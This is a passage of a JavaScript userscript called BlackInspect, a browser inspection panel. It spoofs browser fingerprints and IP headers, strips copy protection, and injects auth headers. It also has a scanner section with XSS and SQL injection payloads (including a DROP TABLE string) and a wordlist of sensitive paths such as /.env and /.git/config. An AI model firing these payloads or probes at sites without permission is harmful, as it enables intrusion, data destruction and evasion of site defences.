                if (param === 37445) return 'Intel Inc.';
                if (param === 37446) return 'Intel Iris OpenGL Engine';
                return origGetParam.call(this, param);
            };
        } catch (e) { }
    }

    // ==================== Canvas Spoof (Improved) ====================
    function applyCanvasSpoof() {
        if (!S.canvasSpoof) return;
        try {
            const origGetContext = HTMLCanvasElement.prototype.getContext;
            HTMLCanvasElement.prototype.getContext = function () {
                const ctx = origGetContext.apply(this, arguments);
                if (ctx && arguments[0] === '2d') {
                    const origGetImageData = ctx.getImageData.bind(ctx);
                    ctx.getImageData = function (x, y, w, h) {
                        const data = origGetImageData(x, y, w, h);
                        const noise = new Uint8Array(data.data.length);
                        crypto.getRandomValues(noise);
                        for (let i = 0; i < data.data.length; i += 4) {
                            data.data[i] = Math.max(0, Math.min(255, data.data[i] + (noise[i] % 3 - 1)));
                            data.data[i + 1] = Math.max(0, Math.min(255, data.data[i + 1] + (noise[i + 1] % 3 - 1)));
                            data.data[i + 2] = Math.max(0, Math.min(255, data.data[i + 2] + (noise[i + 2] % 3 - 1)));
                        }
                        return data;
                    };
                }
                return ctx;
            };
            const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function () {
                const ctx = origGetContext.call(this, '2d');
                if (ctx) {
                    try {
                        const imgData = ctx.getImageData(0, 0, this.width, this.height);
                        const noise = new Uint8Array(1);
                        crypto.getRandomValues(noise);
                        imgData.data[0] ^= (noise[0] & 1);
                        ctx.putImageData(imgData, 0, 0);
                    } catch (e) { }
                }
                return origToDataURL.apply(this, arguments);
            };
        } catch (e) { }
    }

    // ==================== Auth Header Injection ====================
    let _authFetchOrig = W.fetch;
    let _authXHROrig = W.XMLHttpRequest;

    function applyAuthInjection() {
        if (!S.authActive || !S.authHeaderValue) return;
        const hName = S.authHeaderName || 'Authorization';
        const hVal = S.authHeaderValue;
        const origFetch = W.fetch;
        W.fetch = function (...args) {
            let [resource, options = {}] = args;
            const headers = new Headers(options.headers || (resource instanceof Request ? resource.headers : {}));
            headers.set(hName, hVal);
            if (resource instanceof Request) {
                resource = new Request(resource, { ...options, headers });
            } else {
                options = { ...options, headers };
            }
            return origFetch.call(this, resource, options);
        };
        const OrigXHR = W.XMLHttpRequest;
        W.XMLHttpRequest = class extends OrigXHR {
            open(...a) { this._bi_open = true; return super.open(...a); }
            send(...a) {
                if (this._bi_open) this.setRequestHeader(hName, hVal);
                return super.send(...a);
            }
        };
    }

    // ==================== Preflight Prevention ====================
    function applyPreflightPrevention() {
        if (!S.preventPreflight) return;
        const SIMPLE_METHODS = ['GET', 'POST', 'HEAD'];
        const SIMPLE_TYPES = ['application/x-www-form-urlencoded', 'multipart/form-data', 'text/plain'];
        const origFetch = W.fetch;
        W.fetch = function (resource, options = {}) {
            const headers = new Headers(options.headers || {});
            const contentType = headers.get('content-type') || '';
            if (!SIMPLE_TYPES.some(t => contentType.startsWith(t))) {
                headers.set('content-type', 'text/plain');
            }
            for (const key of [...headers.keys()]) {
                const safeHeaders = ['accept', 'accept-language', 'content-language', 'content-type'];
                if (!safeHeaders.includes(key.toLowerCase())) headers.delete(key);
            }
            const method = (options.method || 'GET').toUpperCase();
            return origFetch.call(this, resource, { ...options, headers, method: SIMPLE_METHODS.includes(method) ? method : 'GET' });
        };
    }

    // ==================== Spoofing ====================
    function applySpoofing(ip, ua, plat, lang) {
        const origFetch = W.fetch, origXHR = W.XMLHttpRequest;
        W.fetch = function (...args) {
            let req = args[0];
            if (typeof req === 'string') req = new Request(req, args[1] || {});
            else if (req instanceof Request) req = req.clone();
            const headers = new Headers(req.headers);
            if (ip) headers.set('X-Forwarded-For', ip);
            if (ua) headers.set('User-Agent', ua);
            return origFetch(req, { ...args[1], headers });
        };
        W.XMLHttpRequest = class extends origXHR {
            constructor() {
                super();
                this.addEventListener('readystatechange', function () {
                    if (this.readyState === 1) {
                        if (ip) this.setRequestHeader('X-Forwarded-For', ip);
                        if (ua) this.setRequestHeader('User-Agent', ua);
                    }
                });
            }
        };
        if (ua) Object.defineProperty(N, 'userAgent', { get: () => ua, configurable: true });
        if (plat) Object.defineProperty(N, 'platform', { get: () => plat, configurable: true });
        if (lang) Object.defineProperty(N, 'language', { get: () => lang, configurable: true });
    }

    // Apply on load
    if (S.spoofActive) applySpoofing(S.ip, S.ua, S.platform, S.language);
    if (S.breakOnStart) { breakRestrictions(S.breakOptions); restrictionsBroken = true; }
    applyCanvasSpoof();
    applyTabVisibilitySpoof();
    applyHideExtensions();
    applyBuildIDSpoof();
    applyAntiVM();
    if (S.authActive) applyAuthInjection();
    if (S.preventPreflight) applyPreflightPrevention();
    applyVazirFont();

    // ==================== Break Restrictions ====================
    function breakRestrictions(options) {
        const opts = options || S.breakOptions;
        const EVTS = ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown'];
        // 1. CSS: force user-select
        let brkSt = D.getElementById('bi-brk-st');
        if (!brkSt) {
            brkSt = D.createElement('style');
            brkSt.id = 'bi-brk-st';
            (D.head||D.documentElement).appendChild(brkSt);
        }
        brkSt.textContent = '*,*::before,*::after{user-select:auto!important;-webkit-user-select:auto!important;pointer-events:auto!important;-webkit-touch-callout:default!important;}';
        // 2. Clear inline handlers on all elements
        const clearEl = el => {
            EVTS.forEach(ev => { try { el['on'+ev]=null; } catch(e){} });
            if (el.removeAttribute) EVTS.forEach(ev => el.removeAttribute('on'+ev));
        };
        D.querySelectorAll('*').forEach(clearEl);
        clearEl(D); clearEl(W);
        // 3. Override addEventListener to block future restrictive handlers
        if (!W._biAELPatched) {
            W._biAELPatched = true;
            const _origAEL = EventTarget.prototype.addEventListener;
            const _blocked = new Set(['contextmenu','selectstart','dragstart']);
            EventTarget.prototype.addEventListener = function(type, fn, opt) {
                if (_blocked.has(type) && this !== panel && !(this instanceof HTMLInputElement) && !(this instanceof HTMLTextAreaElement)) return;
                return _origAEL.call(this, type, fn, opt);
            };
        }
        // 4. Capture-phase stop
        const _stop = e => {
            if (e.target && panel && panel.contains(e.target)) return;
            e.stopImmediatePropagation(); e.stopPropagation();
            try { Object.defineProperty(e,'preventDefault',{value:()=>{},configurable:true}); } catch(x){}
        };
        EVTS.forEach(ev => {
            D.addEventListener(ev, _stop, {capture:true,passive:false});
            W.addEventListener(ev, _stop, {capture:true,passive:false});
        });
        // 5. Proper copy — preserve clipboard
        D.addEventListener('copy', e => {
            if (panel && panel.contains(e.target)) return;
            e.stopImmediatePropagation();
            const sel = getSelection().toString();
            if (sel) { try { e.clipboardData && e.clipboardData.setData('text/plain',sel); } catch(x){} }
        }, {capture:true,passive:false});
        // 6. MutationObserver for new elements
        if (!W._biBreakObs) {
            W._biBreakObs = new MutationObserver(muts => {
                muts.forEach(m => m.addedNodes.forEach(n => {
                    if (n.nodeType===1) { clearEl(n); n.querySelectorAll && n.querySelectorAll('*').forEach(clearEl); }
                }));
            });
            W._biBreakObs.observe(D.documentElement, {childList:true, subtree:true});
        }
        // 7. Nuke doc properties
        ['oncontextmenu','onselectstart','oncopy','ondragstart'].forEach(p => {
            try { Object.defineProperty(D,p,{get:()=>null,set:()=>{},configurable:true}); } catch(e){}
        });
    }

    function updateBreakButton() {
        const btn = D.getElementById('breakBtn');
        if (btn) {
            if (restrictionsBroken) {
                btn.textContent = '🔄 ' + _('Restore Restrictions');
                btn.style.background = '#4CAF50';
            } else {
                btn.textContent = '🔓 ' + _('Break Restrictions');
                btn.style.background = '#c53030';
            }
        }
    }

    // ==================== html2canvas loader ====================
    function loadHtml2canvas() {
        return new Promise((resolve, reject) => {
            if (typeof html2canvas === 'function') return resolve(html2canvas);
            if (typeof W.html2canvas === 'function') { html2canvas = W.html2canvas; return resolve(html2canvas); }
            const CDNS = [
                'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js',
                'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js',
            ];
            let i = 0;
            const tryNext = () => {
                if (i >= CDNS.length) return reject(new Error('html2canvas: all CDNs failed'));
                const sc = D.createElement('script');
                sc.src = CDNS[i++];
                sc.onload = () => { html2canvas = W.html2canvas; typeof html2canvas==='function' ? resolve(html2canvas) : tryNext(); };
                sc.onerror = tryNext;
                (D.head||D.documentElement).appendChild(sc);
            };
            tryNext();
        });
    }

    // ==================== PDF.js loader ====================
    function loadPdfjs() {
        return new Promise((resolve, reject) => {
            if (pdfjsLib) return resolve(pdfjsLib);
            const script = D.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js';
            script.onload = () => {
                pdfjsLib = W.pdfjsLib;
                pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
                resolve(pdfjsLib);
            };
            script.onerror = () => reject(new Error('Failed to load PDF.js'));
            D.head.appendChild(script);
        });
    }

    // ==================== Notifications ====================
    function requestNotifPermission() {
        if ('Notification' in W && Notification.permission !== 'granted') {
            Notification.requestPermission();
        }
    }

    function sendNotif(title, body) {
        if ('Notification' in W && Notification.permission === 'granted') {
            new Notification(title, { body });
        }
    }

    // Check todo notifications every 15s
    setInterval(() => {
        const todos = S.todos;
        const now = Date.now();
        let changed = false;
        todos.forEach((todo, i) => {
            if (todo.time && !todo.notified && now >= todo.time) {
                sendNotif('⚙ BlackInspect Todo', todo.text);
                todos[i].notified = true;
                changed = true;
                // Play beep
                try {
                    const ctx = new (W.AudioContext || W.webkitAudioContext)();
                    const osc = ctx.createOscillator();
                    osc.connect(ctx.destination);
                    osc.frequency.value = 800;
                    osc.start(); osc.stop(ctx.currentTime + 0.3);
                } catch (e) {}
            }
        });
        if (changed) S.todos = todos;
    }, 15000);

    // ==================== Kernel Real-time Polling ====================
    async function _checkKernel() {
        try {
            const r = await fetch(S.kernelUrl+'/health', {signal: AbortSignal.timeout ? AbortSignal.timeout(4000) : undefined});
            _kernelOnline = r.ok;
        } catch(e) { _kernelOnline = false; }
        if (_kernelIndicator) {
            _kernelIndicator.style.background = _kernelOnline ? '#22c55e' : '#ef4444';
            _kernelIndicator.title = (_kernelOnline ? '🟢 Kernel Online — ' : '🔴 Kernel Offline — ') + S.kernelUrl;
        }
        const ks = D.getElementById('kernelStatus');
        if (ks && !ks.dataset.manual) ks.textContent = _kernelOnline ? '🟢 Online — '+S.kernelUrl : '🔴 Offline';
    }
    // Defer kernel check until after DOM ready
    if (D.readyState === 'loading') {
        D.addEventListener('DOMContentLoaded', () => { _checkKernel(); setInterval(_checkKernel, 12000); });
    } else {
        _checkKernel(); setInterval(_checkKernel, 12000);
    }

    // ==================== Custom Right-Click Menu ====================
    function setupCustomRightClick() {
        D.addEventListener('contextmenu', (e) => {
            if (!S.customRightClick) return;
            if (e.target.closest('#' + BS) || e.target.closest('#bi-ctxmenu')) return;
            e.preventDefault();
            showCustomContextMenu(e.clientX, e.clientY, e.target);
        }, true);
    }

    function showCustomContextMenu(x, y, target) {
        const existing = D.getElementById('bi-ctxmenu');
        if (existing) existing.remove();
        const menu = D.createElement('div');
        menu.id = 'bi-ctxmenu';
        menu.style.cssText = `position:fixed;top:${Math.min(y, window.innerHeight - 250)}px;left:${Math.min(x, window.innerWidth - 180)}px;background:#252526;border:1px solid #3e3e42;border-radius:6px;z-index:2147483647;min-width:170px;box-shadow:0 4px 16px rgba(0,0,0,0.6);font-family:Consolas,monospace;font-size:12px;color:#d4d4d4;padding:4px 0;`;
        const items = [
            { icon: '📋', text: 'Copy', action: () => { D.execCommand('copy'); } },
            { icon: '✂️', text: 'Cut', action: () => { D.execCommand('cut'); } },
            { icon: '📌', text: 'Paste', action: () => { D.execCommand('paste'); } },
            null,
            { icon: '🔍', text: 'Log Element', action: () => { console.log('[BlackInspect]', target); } },
            { icon: '📝', text: 'Copy HTML', action: () => { N.clipboard && N.clipboard.writeText(target.outerHTML); } },
            { icon: '🔗', text: 'Copy Link URL', action: () => { const a = target.closest('a'); if (a) N.clipboard && N.clipboard.writeText(a.href); } },
            { icon: '🖼', text: 'Copy Image URL', action: () => { const img = target.tagName === 'IMG' ? target : target.querySelector('img'); if (img) N.clipboard && N.clipboard.writeText(img.src); } },
            null,
            { icon: '🔎', text: 'View Page Source', action: () => { window.open('view-source:' + location.href); } },
            { icon: '⚙', text: 'Open BlackInspect', action: () => { if (panel) panel.style.display = panel.style.display === 'none' ? 'flex' : 'flex'; else createPanel(); } },
        ];
        items.forEach(item => {
            if (!item) {
                const sep = D.createElement('div');
                sep.style.cssText = 'border-top:1px solid #3e3e42;margin:3px 0;';
                menu.appendChild(sep);
                return;
            }
            const el = D.createElement('div');
            el.style.cssText = 'padding:6px 12px;cursor:pointer;display:flex;align-items:center;gap:7px;';
            el.innerHTML = `<span>${item.icon}</span><span>${item.text}</span>`;
            el.onmouseenter = () => el.style.background = '#37373d';
            el.onmouseleave = () => el.style.background = 'transparent';
            el.onclick = () => { item.action(); menu.remove(); };
            menu.appendChild(el);
        });
        (D.body||D.documentElement).appendChild(menu);
        const dismiss = () => menu.remove();
        setTimeout(() => {
            D.addEventListener('click', dismiss, { once: true });
            D.addEventListener('keydown', (e) => { if (e.key === 'Escape') dismiss(); }, { once: true });
        }, 0);
    }

    setupCustomRightClick();

    // ==================== Password Auto-Suggest ====================
    (function() {
        function gen24() {
            const U='ABCDEFGHJKLMNPQRSTUVWXYZ',L='abcdefghjkmnpqrstuvwxyz',D2='23456789',SM='!@#$%&*-_=+?';
            const pool=U+L+D2+SM;
            let r=U[Math.random()*U.length|0]+L[Math.random()*L.length|0]+D2[Math.random()*D2.length|0]+SM[Math.random()*SM.length|0];
            while(r.length<24) r+=pool[Math.random()*pool.length|0];
            return r.split('').sort(()=>Math.random()-.5).join('');
        }
        function showSuggest(inp) {
            const old=D.getElementById('bi-ps-box'); if(old)old.remove();
            const pwd=gen24();
            const rect=inp.getBoundingClientRect();
            const box=D.createElement('div');
            box.id='bi-ps-box';
            box.style.cssText=`position:fixed;left:${Math.max(0,rect.left)}px;top:${rect.bottom+4}px;z-index:2147483645;
                background:#1e1e1e;border:1.5px solid #007acc;border-radius:8px;overflow:hidden;
                box-shadow:0 8px 28px rgba(0,0,0,.75);font-family:Consolas,monospace;min-width:${Math.max(rect.width,280)}px;`;
            box.innerHTML=`
              <div style="padding:5px 10px;background:#252526;color:#888;font-size:10px;border-bottom:1px solid #333;">
                🔑 BlackInspect — رمز ۲۴ کاراکتری پیشنهادی
              </div>
              <div id="bi-ps-pwd" style="padding:9px 12px;color:#9cdcfe;letter-spacing:1.5px;cursor:pointer;word-break:break-all;font-size:13px;transition:background .15s;"
                   title="کلیک: استفاده در همه فیلدها">${pwd}</div>
              <div style="display:flex;border-top:1px solid #333;">
                <button id="bi-ps-use"  style="flex:1;padding:6px;background:#0e639c;color:#fff;border:none;cursor:pointer;font-size:11px;font-family:Consolas;">✅ استفاده برای همه</button>
                <button id="bi-ps-cpy"  style="flex:1;padding:6px;background:#333;color:#ccc;border:none;border-right:1px solid #444;cursor:pointer;font-size:11px;font-family:Consolas;">📋 فقط کپی</button>
                <button id="bi-ps-new"  style="flex:1;padding:6px;background:#252526;color:#888;border:none;cursor:pointer;font-size:11px;font-family:Consolas;">🔄 جدید</button>
              </div>`;
            D.body.appendChild(box);
            const applyAll = () => {
                D.querySelectorAll('input[type=password]').forEach(f=>{f.value=pwd;f.dispatchEvent(new Event('input',{bubbles:true}));f.dispatchEvent(new Event('change',{bubbles:true}));});
                box.remove();
            };
            box.querySelector('#bi-ps-use').onclick = applyAll;
            box.querySelector('#bi-ps-pwd').onclick = applyAll;
            box.querySelector('#bi-ps-cpy').onclick = () => { N.clipboard&&N.clipboard.writeText(pwd); box.remove(); };
            box.querySelector('#bi-ps-new').onclick = () => { box.remove(); showSuggest(inp); };
            const dismiss = e => { if(!box.contains(e.target)&&e.target!==inp){ box.remove(); D.removeEventListener('mousedown',dismiss,true); }};
            setTimeout(()=>D.addEventListener('mousedown',dismiss,{capture:true}),120);
        }
        D.addEventListener('focus', e => {
            if(e.target&&e.target.type==='password'&&!(panel&&panel.contains(e.target))) showSuggest(e.target);
        }, true);
    })();

    // ==================== Panel Helpers ====================
    function getDefaultPanelSize() {
        const w = window.innerWidth, h = window.innerHeight;
        if (w < 600) return { width: w - 10, height: h - 10, left: 5, top: 5 };
        return { width: 860, height: 520, left: 10, top: 10 };
    }

    function resetPanelPosition() {
        const def = getDefaultPanelSize();
        S.panelLeft = def.left; S.panelTop = def.top; S.panelWidth = def.width; S.panelHeight = def.height;
        if (panel) {
            panel.style.left = def.left + 'px'; panel.style.top = def.top + 'px';
            panel.style.width = def.width + 'px'; panel.style.height = def.height + 'px';
        }
    }

    function refreshPanel() {
        if (panel) { panel.remove(); panel = null; }
        createPanel();
    }

    // Ctrl+Z reset position | Ctrl+G toggle panel
    function _biKeys(e) {
        if (e.ctrlKey && (e.key === 'z' || e.key === 'Z')) {
            if (panel && panel.style.display !== 'none') {
                e.preventDefault(); e.stopPropagation();
                resetPanelPosition();
            }
            return;
        }
        if (e.ctrlKey && (e.key === 'g' || e.key === 'G')) {
            e.preventDefault(); e.stopPropagation();
            if (!panel) createPanel();
            else panel.style.display = (panel.style.display === 'none') ? 'flex' : 'none';
        }
    }
    D.addEventListener('keydown', _biKeys, true);
    W.addEventListener('keydown', _biKeys, true);

    async function saveToDirectory(filename, blob) {
        if (!saveDirectoryHandle) return false;
        try {
            const fh = await saveDirectoryHandle.getFileHandle(filename, { create: true });
            const w = await fh.createWritable();
            await w.write(blob); await w.close();
            return true;
        } catch (e) {
            const a = D.createElement('a');
            a.href = URL.createObjectURL(blob); a.download = filename; a.click();
            URL.revokeObjectURL(a.href); return false;
        }
    }

    function dlBlob(blob, filename) {
        if (saveDirectoryHandle) { saveToDirectory(filename, blob); return; }
        const a = D.createElement('a');
        a.href = URL.createObjectURL(blob); a.download = filename; a.click();
        URL.revokeObjectURL(a.href);
    }

    // ==================== FPS Counter ====================
    function startFPS(display) {
        fpsCount = 0; fpsLastTime = performance.now();
        function frame() {
            fpsCount++;
            const now = performance.now();
            if (now - fpsLastTime >= 1000) {
                currentFps = fpsCount;
                fpsCount = 0; fpsLastTime = now;
                if (display) display.textContent = currentFps + ' FPS';
            }
            fpsRafId = requestAnimationFrame(frame);
        }
        fpsRafId = requestAnimationFrame(frame);
    }

    function stopFPS() {
        if (fpsRafId) { cancelAnimationFrame(fpsRafId); fpsRafId = null; }
    }

    // ==================== Security Scanner Utils ====================
    const XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'><svg/onload=alert(1)>",
        '<body onload=alert(1)>',
        '"-alert(1)-"',
        'javascript:alert(1)',
    ];

    const SQLI_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "1 UNION SELECT null--",
        "' AND SLEEP(3)--", "1; DROP TABLE users--",
    ];

    const SQLI_ERRORS = ['sql syntax', 'mysql_fetch', 'ora-', 'sqlite_', 'pg_query', 'syntax error', 'odbc driver', 'unclosed quotation'];

    const DIR_WORDLIST = [
        '/admin', '/administrator', '/login', '/wp-admin', '/wp-login.php',
        '/phpMyAdmin', '/phpmyadmin', '/.git', '/.git/config', '/.env',
        '/api', '/api/v1', '/api/v2', '/config', '/backup', '/backups',
        '/test', '/dev', '/staging', '/robots.txt', '/sitemap.xml',
        '/.htaccess', '/.htpasswd', '/server-status', '/server-info',
        '/upload', '/uploads', '/files', '/static', '/assets',
        '/console', '/dashboard', '/panel', '/manage', '/management',
        '/secret', '/private', '/hidden', '/old', '/temp', '/tmp',
    ];

    const CNAME_SERVICES = {
        'github.io': 'GitHub Pages', 'herokuapp.com': 'Heroku',
        's3.amazonaws.com': 'AWS S3', 'azurewebsites.net': 'Azure',
        'netlify.app': 'Netlify', 'vercel.app': 'Vercel',
        'shopify.com': 'Shopify', 'fastly.net': 'Fastly',
        'squarespace.com': 'Squarespace', 'myshopify.com': 'Shopify',
        'desk.com': 'Desk.com', 'helpjuice.com': 'Helpjuice',
        'readme.io': 'ReadMe', 'surge.sh': 'Surge',
    };

    // ==================== Panel Creation ====================
    function createPanel() {
        if (panel) return;
        const isRTL = S.lang === 'fa';
        const def = getDefaultPanelSize();

        panel = D.createElement('div');
        panel.id = BS;
        panel.dir = isRTL ? 'rtl' : 'ltr';
        panel.style.cssText = `
            position:fixed;top:${S.panelTop||def.top}px;left:${S.panelLeft||def.left}px;
            width:${S.panelWidth||def.width}px;height:${S.panelHeight||def.height}px;
            background:#1e1e1e;color:#d4d4d4;font-family:Consolas,monospace;font-size:13px;
            border-radius:6px;box-shadow:0 8px 32px rgba(0,0,0,0.7);z-index:2147483646;
            overflow:hidden;display:flex;flex-direction:column;border:1px solid #3e3e42;
            resize:both;min-width:320px;min-height:300px;
            max-width:calc(100vw - 10px);max-height:calc(100vh - 10px);
            opacity:${S.panelOpacity};
        `;

        const isoStyle = D.createElement('style');
        isoStyle.textContent = `
            #${BS}{direction:${isRTL?'rtl':'ltr'}!important;text-align:${isRTL?'right':'left'}!important;unicode-bidi:isolate!important;}
            #${BS} *{direction:inherit;text-align:inherit;box-sizing:border-box;}
            #${BS} input,#${BS} textarea,#${BS} select{background:#3c3c3c;color:#d4d4d4;border:1px solid #555;border-radius:3px;padding:4px;width:100%;}
            #${BS} button{cursor:pointer;border:none;border-radius:4px;padding:6px 10px;font-family:inherit;font-size:12px;}
            #${BS} h4{margin:8px 0 4px;color:#007acc;font-size:12px;}
            #${BS} .bi-sec{background:#252526;padding:10px;border-radius:4px;margin-bottom:8px;}
            #${BS} .bi-row{display:flex;gap:6px;align-items:center;margin-bottom:5px;}
            #${BS} .bi-hidden{display:none!important;}
            @media(max-width:600px){#${BS}{font-size:11px;}#${BS} button{padding:6px 4px;font-size:10px;}}
        `;
        panel.appendChild(isoStyle);

        // Header
        const header = D.createElement('div');
        header.style.cssText = 'background:#252526;padding:8px 12px;cursor:move;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #3e3e42;user-select:none;color:#007acc;flex-shrink:0;';
        header.innerHTML = `<span style="font-weight:bold;font-size:13px;">⚙ ${_('BlackInspect v7.0')}</span><div style="display:flex;gap:8px;align-items:center;"><span id="bi-fps-hud" style="font-size:11px;color:#6a9955;"></span><span id="biclose" style="cursor:pointer;color:#ccc;font-size:18px;line-height:1;">×</span></div>`;
        panel.appendChild(header);

        // Tabs
        const tabs = D.createElement('div');
        tabs.style.cssText = 'display:flex;background:#2d2d2d;border-bottom:1px solid #3e3e42;overflow-x:auto;white-space:nowrap;flex-shrink:0;';
        const tabNames = ['Info','Vars','Inject','Spoof','Pass','Storage','Tools','DOM','Canvas','ModReq','Network','Security','PDF','Todo','Sync','Safe','Settings'];
        tabNames.forEach(name => {
            const btn = D.createElement('button');
            btn.dataset.tab = name;
            btn.textContent = _(name);
            btn.style.cssText = 'background:transparent;color:#ccc;border:none;border-bottom:2px solid transparent;padding:6px 8px;cursor:pointer;font-family:Consolas,monospace;font-size:11px;white-space:nowrap;flex-shrink:0;';
            btn.addEventListener('click', () => showTab(name));
            tabs.appendChild(btn);
        });
        panel.appendChild(tabs);

        const content = D.createElement('div');
        content.style.cssText = 'padding:10px;overflow-y:auto;flex:1;background:#1e1e1e;';
        panel.appendChild(content);

        (D.body||D.documentElement).appendChild(panel);
        D.getElementById('biclose').onclick = () => { panel.style.display = 'none'; };
        // Kernel status dot in header
        const _kDot = D.createElement('div');
        _kDot.id = 'bi-kdot';
        _kDot.style.cssText = 'width:8px;height:8px;border-radius:50%;background:#ef4444;cursor:pointer;flex-shrink:0;transition:background .3s;margin-left:2px;';
        _kDot.title = '🔴 Kernel Offline';
        _kDot.onclick = ()=>_checkKernel();
        const _hd = D.getElementById('biclose');
        if(_hd&&_hd.parentNode) _hd.parentNode.insertBefore(_kDot,_hd);
        _kernelIndicator = _kDot;
        _checkKernel();
        // Apply saved font size
        const _sfs = GM_getValue('bi_font_size','13');
        if(panel) panel.style.fontSize = _sfs+'px';

        // Drag
        let isDragging = false, startX, startY;
        header.addEventListener('mousedown', e => { isDragging = true; startX = e.clientX - panel.offsetLeft; startY = e.clientY - panel.offsetTop; D.body.style.userSelect = 'none'; });
        D.addEventListener('mousemove', e => {
            if (!isDragging) return;
            panel.style.left = (e.clientX - startX) + 'px';
            panel.style.top = (e.clientY - startY) + 'px';
            S.panelLeft = e.clientX - startX; S.panelTop = e.clientY - startY;
        });
        D.addEventListener('mouseup', () => { isDragging = false; D.body.style.userSelect = ''; S.panelWidth = panel.offsetWidth; S.panelHeight = panel.offsetHeight; });
        // ResizeObserver — persist size on manual resize
        if (typeof ResizeObserver !== 'undefined') {
            const _ro = new ResizeObserver(() => {
                if (!panel) return;
                const w=panel.offsetWidth, h=panel.offsetHeight;
                if(w>150&&h>150){ S.panelWidth=w; S.panelHeight=h; }
            });
            _ro.observe(panel);
        }

        applyVazirFont();

        // ============================================================
        // Tab Implementations
        // ============================================================
        function showTab(tab) {
            [...tabs.children].forEach(b => b.style.borderBottom = '2px solid transparent');
            const active = [...tabs.children].find(b => b.dataset.tab === tab);
            if (active) active.style.borderBottom = '2px solid #007acc';
            content.innerHTML = '';
            S.activeTab = tab;

            // ---- Info ----
            if (tab === 'Info') {
                content.innerHTML = `<div style="color:#007acc;margin-bottom:6px;font-weight:bold;">🌐 <span id="inf-title"></span></div>
                <div id="inf-url" style="color:#888;font-size:11px;word-break:break-all;margin-bottom:8px;"></div>
                <div id="inf-body" style="color:#9cdcfe;font-size:12px;"></div>`;
                D.getElementById('inf-title').textContent = D.title;
                D.getElementById('inf-url').textContent = location.href;
                const body = D.getElementById('inf-body');
                let html = `<b>📡 ${_('Network')}</b><br>
                🖥 ${_('Server')}: <span id="srv">...</span><br>
                📡 ${_('IP')}: <span id="pgip">...</span><br>
                🔒 ${_('Protocol')}: ${performance.getEntriesByType('navigation')[0]?.nextHopProtocol || 'N/A'}<br><br>
                <b>📄 ${_('Page')}</b><br>
                📝 ${_('Desc')}: ${D.querySelector('meta[name="description"]')?.content || '—'}<br>
                🌐 ${_('Charset')}: ${D.characterSet} | 📱 ${_('Viewport')}: ${D.querySelector('meta[name="viewport"]')?.content || '—'}<br>
                🔗 ${_('Links')}: ${D.links.length} | ${_('Img')}: ${D.images.length} | ${_('Scripts')}: ${D.scripts.length} | ${_('CSS')}: ${D.styleSheets.length} | ${_('Forms')}: ${D.forms.length}<br>
                📏 ${_('Nodes')}: ${D.querySelectorAll('*').length} | ${_('Size')}: ${(new Blob([D.documentElement.outerHTML]).size/1024).toFixed(1)} KB<br>
                ⏱ ${_('Load')}: ${performance.timing.loadEventEnd - performance.timing.navigationStart}ms<br><br>
                <b>📋 ${_('Response Headers')}</b><br><div id="rh" style="font-size:11px;color:#888;"></div>`;
                body.innerHTML = html;
                (async () => {
                    try {
                        const r = await fetch(location.href, { method: 'HEAD' });
                        D.getElementById('srv').textContent = r.headers.get('Server') || '—';
                        let rh = ''; r.headers.forEach((v, k) => rh += `<span style="color:#9cdcfe;">${k}</span>: ${v}<br>`);
                        D.getElementById('rh').innerHTML = rh || _('No headers');
                    } catch (e) { D.getElementById('srv').textContent = _('Error'); }
                    try {
                        const r2 = await fetch(`https://dns.google/resolve?name=${location.hostname}&type=A`);
                        const d = await r2.json();
                        D.getElementById('pgip').textContent = d.Answer?.[0]?.data || 'N/A';
                    } catch (e) { D.getElementById('pgip').textContent = _('Error'); }
                })();
            }

            // ---- Vars ----
            else if (tab === 'Vars') {
                content.innerHTML = `<input id="varFilter" placeholder="${_('Filter...')}" style="margin-bottom:6px;">
                <div style="display:flex;gap:4px;margin-bottom:6px;">
                    <button id="scanVars" style="flex:1;background:#4d4d4d;color:#fff;">🔄 ${_('Scan Variables')}</button>
                    <button id="exportVars" style="flex:1;background:#2d2d2d;color:#ccc;border:1px solid #555;">💾 ${_('Export JSON')}</button>
                </div>
                <div id="varList" style="max-height:300px;overflow-y:auto;font-size:11px;background:#252526;padding:6px;border-radius:3px;"></div>`;
                const getBaseKeys = () => { const ifr = D.createElement('iframe'); ifr.src='about:blank'; D.body.appendChild(ifr); const k=Object.keys(ifr.contentWindow||{}); ifr.remove(); return k; };
                const baseKeys = getBaseKeys();
                const scanVars = () => {
                    const lst = D.getElementById('varList'); lst.innerHTML = '⏳ ...';
                    try {
                        const custom = Object.keys(W).filter(k => !baseKeys.includes(k)).sort();
                        const filter = D.getElementById('varFilter').value.toLowerCase();
                        const filtered = filter ? custom.filter(k => k.toLowerCase().includes(filter)) : custom;
                        if (!filtered.length) { lst.innerHTML = `<span style="color:#808080;">${_('No variables found.')}</span>`; return; }
                        lst.innerHTML = filtered.map(key => {
                            const val = W[key], type = typeof val;
                            let disp = '';
                            try {
                                if (type === 'function') disp = _('function()');
                                else if (type === 'object' && val) disp = JSON.stringify(val).substring(0,80) + '…';
                                else if (type === 'string') disp = `"${val.substring(0,60)}"`;
                                else disp = String(val).substring(0,60);
                            } catch (e) { disp = _('(error)'); }
                            return `<div style="margin-bottom:2px;cursor:pointer;" onclick="var v=prompt('${_('New value for')} ${key}:',String(window['${key}']));if(v!==null){try{eval('window.${key}='+v);}catch(e){window['${key}']=v;}}"><span style="color:#9cdcfe;">${key}</span> <span style="color:#6a9955;">(${type})</span> = <span style="color:#ce9178;">${disp}</span></div>`;
                        }).join('');
                    } catch (e) { lst.innerHTML = `<span style="color:red;">${_('Error')}: ${e.message}</span>`; }
                };
                D.getElementById('scanVars').onclick = scanVars;
                D.getElementById('varFilter').oninput = scanVars;
                D.getElementById('exportVars').onclick = () => {
                    const data = Object.keys(W).filter(k => !baseKeys.includes(k)).reduce((a,k) => { try { a[k]=W[k]; } catch(e){} return a; }, {});
